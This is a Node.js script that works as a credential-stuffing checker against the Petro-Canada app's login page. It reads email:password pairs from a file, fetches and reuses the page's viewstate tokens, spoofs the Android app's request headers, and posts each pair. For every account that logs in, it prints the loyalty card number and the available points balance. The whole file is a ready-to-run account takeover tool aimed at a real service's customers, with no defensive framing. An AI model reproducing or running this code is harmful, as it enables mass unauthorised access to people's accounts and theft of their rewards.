const request = require('request');
const jsdom = require('jsdom');
const readline = require('linebyline');


const loginPage = 'https://app.petro-canada.ca/en/login.aspx?app';
const host = 'app.petro-canada.ca';
const androidAppId = 'com.petrocanada.my_petro_canada';

// Fetch accounts.txt and login each email:password
//postLogin('email@gmail.net', 'password').catch(err => console.error(err));

 var accounts = readline('./accounts.txt');
accounts.on('line', async function (line, lineCount, byteCount) {
    var split = line.split(':');
    var email = split[0];
    var password = split[1];

    postLogin(email, password).catch(err => console.error(err));
});


// 1st step
// Fetch login page and get some data

function fetchLoginPageToken() {
    return new Promise((resolve, reject) => {
        request({
            method: 'GET',
            url: loginPage,
            headers: {
                "Host": host,
                "Upgrade-Insecure-Requests": "1",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US",
                "X-Requested-With": androidAppId,
                "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36",
            },
        }, function (error, response, body) {
            try {
                var dom = new jsdom.JSDOM(body);
                var viewstate = dom.window.document.getElementById('__VIEWSTATE').value;
                var eventvalidation = dom.window.document.getElementById('__EVENTVALIDATION').value;
                resolve({ viewstate, eventvalidation });
            } catch (err) {
                reject(err);
            }
        });
    });
}

// 2nd step
// Use that data and post login info

function postLogin(email, password) {
    return new Promise(async (resolve, reject) => {
        try {
            var tokens = await fetchLoginPageToken();

            request({
                method: 'POST',
                url: loginPage,
                headers: {
                    "Host": host,
                    "Upgrade-Insecure-Requests": "1",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Language": "en-US",
                    "X-Requested-With": androidAppId,
                    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; vivo 1601 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36",
                    "Referer": loginPage,
                    "Origin": "https://app.petro-canada.ca",
                    "Content-type": "application/x-www-form-urlencoded",
                },
                formData: {
                    __EVENTTARGET: '',
                    __EVENTARGUMENT: '',
                    __VIEWSTATE: tokens.viewstate,
                    __EVENTVALIDATION: tokens.eventvalidation,
                    'id351$txtEmail': email,
                    'id351$txtPassword': password,
                    'id351$btnSubmit': 'Log in',
                },
            }, function (error, response, body) {
                if (error) return reject(error);

                // Check if login is successful
                if (body.indexOf('btnLogout') >= 0) {
                    var dom = new jsdom.JSDOM(body);

                    console.log(`${email} login successful`);
                    var sourcePage = new jsdom.JSDOM(dom.window.document.querySelector('section.content.noBottomPad.linearGradient').innerHTML);
                    console.log('Card Number:', sourcePage.window.document.querySelector('h3').innerHTML);
                    console.log('Available Points:', sourcePage.window.document.querySelector('nobr').innerHTML);
                } else {
                    console.log(`${email} login failed`);
                }
            });
        } catch(err) {
            reject(err);
        }
    });
}

// 3rd step
// If login success, fetch some user data

